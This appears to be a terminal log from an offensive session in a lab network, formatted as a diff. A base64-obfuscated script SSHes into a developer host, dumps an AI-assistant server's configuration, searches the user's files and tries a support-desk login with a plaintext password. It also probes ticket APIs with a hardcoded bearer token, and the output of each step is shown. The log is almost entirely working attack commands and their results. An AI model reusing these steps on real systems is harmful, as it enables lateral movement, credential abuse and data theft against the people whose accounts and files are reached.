@@ -1,0 +1,80 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r3.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKc2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkE9aHR0cHM6Ly9hc3Npc3RhbnQua2VwbGVyb3BzLnRlc3QKZWNobyAiIyMjIyMjIyMjIyBTRVRVUC1DT01QTEVURSBGVUxMIgpjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgIiRBL2FwaS9zZXR1cC1jb21wbGV0ZSIgMj4mMQplY2hvCmVjaG8gIiMjIyMjIyMjIyMgRlMgR1JFUCBhc3Npc3RhbnQvYW55dGhpbmdsbG0iCmdyZXAgLXJpbCAtLWV4Y2x1ZGUtZGlyPS5jYWNoZSAtLWV4Y2x1ZGUtZGlyPW5vZGVfbW9kdWxlcyAtLWV4Y2x1ZGUtZGlyPS5naXQgJ2FueXRoaW5nbGxtXHxhc3Npc3RhbnRcLmtlcGxlcm9wc1x8YXNzaXN0YW50JyAvaG9tZS9yb3dhbiAvZXRjIC9zcnYgL29wdCAyPi9kZXYvbnVsbCB8IGhlYWQgLTQwCmVjaG8gIiMjIyMjIyMjIyMgd29yayBkaXJzIgpmaW5kIC9ob21lL3Jvd2FuIC1tYXhkZXB0aCAzIC1uYW1lICcqLm1kJyAtbyAtbWF4ZGVwdGggMyAtbmFtZSAnKi5qc29uJyAtbyAtbWF4ZGVwdGggMyAtbmFtZSAnKi55bWwnIDI+L2Rldi9udWxsIHwgZ3JlcCAtdiBub2RlX21vZHVsZXMgfCBoZWFkIC02MAplY2hvICIjIyMjIyMjIyMjIHN1cHBvcnQgZGVzayBsb2dpbiB0ZXN0IgpjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLW8gL3RtcC9zdXBfbG9naW4uaHRtbCAtdyAnJXtodHRwX2NvZGV9XG4nIC1jIC90bXAvc3VwamFyIC1kICd1c2VyaWQ9bWF5YS5yYW5zY29tYmUmcGFzc3dkPXNXUWEzMTA4NUZUUWVrWmhIVHhVeWZfOUUxbWFycTB1cjhXTkNLbVR0bmsmZG89c2lnbi1pbicgaHR0cHM6Ly9zdXBwb3J0LmtlcGxlcm9wcy50ZXN0L3NjcC9sb2dpbi5waHAgMj4mMQpncmVwIC1vICdMb2NhdGlvbjogLionIC90bXAvc3VwX2xvZ2luLmh0bWwgfCBoZWFkCmN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtYiAvdG1wL3N1cGphciAtbyAvdG1wL3N1cF90aXguaHRtbCAtdyAndGlja2V0czole2h0dHBfY29kZX1cbicgJ2h0dHBzOi8vc3VwcG9ydC5rZXBsZXJvcHMudGVzdC9zY3AvdGlja2V0cy5waHAnIDI+JjEKZ3JlcCAtb0UgJ3RpY2tldHNcLnBocFw/aWQ9WzAtOV0rW14iXSonIC90bXAvc3VwX3RpeC5odG1sIHwgc29ydCAtdSB8IGhlYWQgLTIwCmdyZXAgLW9FICc8dGRbXj5dKj5bXjxdezMsODB9PC90ZD4nIC90bXAvc3VwX3RpeC5odG1sIHwgaGVhZCAtNDAKZWNobyAiIyMjIyMjIyMjIyBzdXBwb3J0IGFwaSB3aXRoIGJlYXJlciIKZm9yIHAgaW4gL2FwaS90aWNrZXRzIC9hcGkvdGlja2V0cy9TVVAtMjg0MSAvYXBpL2Nhc2VzIC9hcGkvc3VwcG9ydC9jYXNlcyAvYXBpL3YxL3RpY2tldHM7IGRvCiBlY2hvICItLS0gJHAiOyBjdXJsIC1zUyAtbSA2IC0tY2FjZXJ0ICRDQSAtaSAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyIGZrX3N1cHBvcnRfcm93YW5fMmZ4dFhOa1VqS01iY3ZQQmxBb3QwSnAwdlZOcHBMOWIiICJodHRwczovL3N1cHBvcnQua2VwbGVyb3BzLnRlc3QkcCIgMj4mMSB8IGhlYWQgLTgKZG9uZQpJTk5FUgplY2hvIERPTkVfTUFSS18kUkFORE9NCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r3.sh; bash /tmp/r3.sh; echo DONEMARK_1795198947618$((6*7))
+########## SETUP-COMPLETE FULL
+{"results":{"RequiresAuth":true,"AuthToken":true,"JWTSecret":true,"StorageDir":"/app/server/storage","MultiUserMode":true,"MemoryEnabled":false,"MemoryAutoExtraction":true,"DisableTelemetry":"true","EmbeddingEngine":"native","HasExistingEmbeddings":true,"HasCachedEmbeddings":true,"EmbeddingModelPref":"Xenova/all-MiniLM-L6-v2","EmbeddingOutputDimensions":null,"OllamaEmbeddingBatchSize":1,"VoyageAiApiKey":false,"GenericOpenAiEmbeddingApiKey":false,"GenericOpenAiEmbeddingMaxConcurrentChunks":500,"GeminiEmbeddingApiKey":false,"GenericOpenAiEmbeddingPassagePrefix":"","GenericOpenAiEmbeddingQueryPrefix":"","ImageGenerationProvider":null,"ImageGenerationModelPref":null,"ImageGenerationDimensions":"512x512","ImageGenerationOpenAiKey":false,"ImageGenerationOpenRouterApiKey":false,"ImageGenerationOllamaAuthToken":false,"ImageGenerationLemonadeApiKey":false,"ImageGenerationLocalAiApiKey":false,"ImageGenerationLlmmanAuthToken":false,"ImageGenerationGeminiApiKey":false,"VectorDB":"lancedb","PineConeKey":false,"ChromaApiKey":false,"ChromaCloudApiKey":false,"WeaviateApiKey":false,"QdrantApiKey":false,"MilvusPassword":false,"ZillizApiToken":false,"AstraDBApplicationToken":false,"PGVectorConnectionString":false,"PGVectorTableName":"anythingllm_vectors","LLMProvider":"ollama","LLMModel":"fieldlink-qwen:latest","ModelRouterId":null,"OpenAiKey":false,"OpenAiModelPref":"gpt-4.1-nano","AzureOpenAiKey":false,"AzureOpenAiTokenLimit":4096,"AzureOpenAiModelType":"default","AnthropicApiKey":false,"AnthropicModelPref":"claude-sonnet-4-6","AnthropicCacheControl":"none","GeminiLLMApiKey":false,"GeminiLLMModelPref":"gemini-2.0-flash-lite","GeminiSafetySetting":"BLOCK_MEDIUM_AND_ABOVE","LMStudioTokenLimit":null,"LMStudioAuthToken":false,"LocalAiApiKey":false,"OllamaLLMAuthToken":false,"OllamaLLMBasePath":"http://fieldlink-ollama:11434","OllamaLLMModelPref":"fieldlink-qwen:latest","OllamaLLMTokenLimit":"4096","OllamaLLMKeepAliveSeconds":300,"NovitaLLMApiKey":false,"TogetherAiApiKey":false,"FireworksAiLLMApiKey":false,"PerplexityApiKey":false,"OpenRouterApiKey":false,"MistralApiKey":false,"GroqApiKey":false,"TextGenWebUIAPIKey":false,"LiteLLMApiKey":false,"MoonshotAiApiKey":false,"MoonshotAiModelPref":"moonshot-v1-32k","GenericOpenAiKey":false,"AwsBedrockLLMApiKey":false,"AwsBedrockLLMTokenLimit":8192,"AwsBedrockLLMMaxTokens":4096,"CohereApiKey":false,"DeepSeekApiKey":false,"ApipieLLMApiKey":false,"XAIApiKey":false,"PPIOApiKey":false,"CometApiLLMApiKey":false,"ZAiApiKey":false,"GiteeAIApiKey":false,"GiteeAITokenLimit":8192,"LlmmanTokenLimit":8192,"LlmmanKeepAliveSeconds":300,"LlmmanAuthToken":false,"SambaNovaLLMApiKey":false,"LemonadeLLMApiKey":false,"LemonadeLLMModelTokenLimit":8192,"EmbeddedLemonadeEnabled":false,"EmbeddedLemonadeTokenLimit":null,"MinimaxApiKey":false,"CerebrasApiKey":false,"VertexAiLLMApiKey":false,"OMLXLLMApiKey":false,"WhisperProvider":"local","WhisperModelPref":"Xenova/whisper-small","WhisperGenericOpenAiApiKey":false,"TextToSpeechProvider":"native","TTSOpenAIKey":false,"TTSElevenLabsKey":false,"TTSPiperTTSVoiceModel":"en_US-hfc_female-medium","TTSOpenAICompatibleKey":false,"TTSKokoroKey":false,"SpeechToTextProvider":"native","STTDeepgramApiKey":false,"STTOpenAICompatibleKey":false,"STTGroqApiKey":false,"AgentSerpApiKey":null,"AgentSerpApiEngine":"google","AgentSearchApiKey":null,"AgentSearchApiEngine":"google","AgentSerperApiKey":null,"AgentBingSearchApiKey":null,"AgentBaiduSearchApiKey":null,"AgentSerplyApiKey":null,"AgentSearXNGApiUrl":null,"AgentTavilyApiKey":null,"AgentExaApiKey":null,"AgentPerplexityApiKey":null,"AgentBraveApiKey":null,"AgentCrwApiKey":null,"AgentCrwApiUrl":null,"AgentYouApiKey":null,"AgentKeenableApiKey":null,"AgentKeenableApiUrl":null,"AgentAnySearchApiKey":null,"AgentFirecrawlApiKey":null,"DisableViewChatHistory":false,"WorkspaceDeletionProtection":false,"SimpleSSOEnabled":false,"SimpleSSONoLogin":false,"SimpleSSONoLoginRedirect":null,"AgentSkillMaxToolCalls":10,"AgentSkillRerankerEnabled":true,"AgentSkillRerankerTopN":15,"AgentClarifyingQuestionsEnabled":false,"AgentClarifyingQuestionsMaxPerTurn":3}}
+########## FS GREP assistant/anythingllm
+/home/rowan/work/platform-access.md
+/etc/hosts
+########## work dirs
+/home/rowan/.config/fieldlink/support-client.json
+/home/rowan/README.md
+/home/rowan/work/reproducers/indexer-client.json
+/home/rowan/work/registry/inspection-normal.json
+/home/rowan/work/registry/consumer-request.json
+/home/rowan/work/registry/README.md
+/home/rowan/work/build-operations/release-lineage-review.md
+/home/rowan/work/build-operations/policy-compiler-handoff.md
+/home/rowan/work/build-operations/connector-archive-review.md
+/home/rowan/work/local-helper.md
+/home/rowan/work/samples/FK-SAMPLE-017.json
+/home/rowan/work/identity-access.md
+/home/rowan/work/service-notes.md
+/home/rowan/work/fieldlink-connector/README.md
+/home/rowan/work/platform-access.md
+########## support desk login test
+302
+tickets:302
+########## support api with bearer
+--- /api/tickets
+HTTP/1.1 400 Bad Request
+Server: nginx
+Date: Fri, 20 Nov 2026 18:22:38 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 17
+Connection: keep-alive
+X-Powered-By: PHP/8.4.27
+Set-Cookie: OSTSESSID=f4ebb3edd1a124f2f4e2302792188459; expires=Fri, 20 Nov 2026 18:46:38 GMT; Max-Age=1440; path=/; domain=support.keplerops.test; secure; HttpOnly
+--- /api/tickets/SUP-2841
+HTTP/1.1 400 Bad Request
+Server: nginx
+Date: Fri, 20 Nov 2026 18:22:38 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 17
+Connection: keep-alive
+X-Powered-By: PHP/8.4.27
+Set-Cookie: OSTSESSID=db79a3b14664a827ed87eaae0a57f1fa; expires=Fri, 20 Nov 2026 18:46:38 GMT; Max-Age=1440; path=/; domain=support.keplerops.test; secure; HttpOnly
+--- /api/cases
+HTTP/1.1 301 Moved Permanently
+Server: nginx
+Date: Fri, 20 Nov 2026 18:22:38 GMT
+Content-Type: text/html
+Content-Length: 162
+Location: https://support.keplerops.test/api/cases/
+Connection: keep-alive
+
+--- /api/support/cases
+HTTP/1.1 400 Bad Request
+Server: nginx
+Date: Fri, 20 Nov 2026 18:22:38 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 17
+Connection: keep-alive
+X-Powered-By: PHP/8.4.27
+Set-Cookie: OSTSESSID=ee2118dfae248f15a31fb397181b7dab; expires=Fri, 20 Nov 2026 18:46:38 GMT; Max-Age=1440; path=/; domain=support.keplerops.test; secure; HttpOnly
+--- /api/v1/tickets
+HTTP/1.1 400 Bad Request
+Server: nginx
+Date: Fri, 20 Nov 2026 18:22:38 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 17
+Connection: keep-alive
+X-Powered-By: PHP/8.4.27
+Set-Cookie: OSTSESSID=8b3ecce83f2237ea01339af8ca6b711e; expires=Fri, 20 Nov 2026 18:46:38 GMT; Max-Age=1440; path=/; domain=support.keplerops.test; secure; HttpOnly
+DONE_MARK_30625
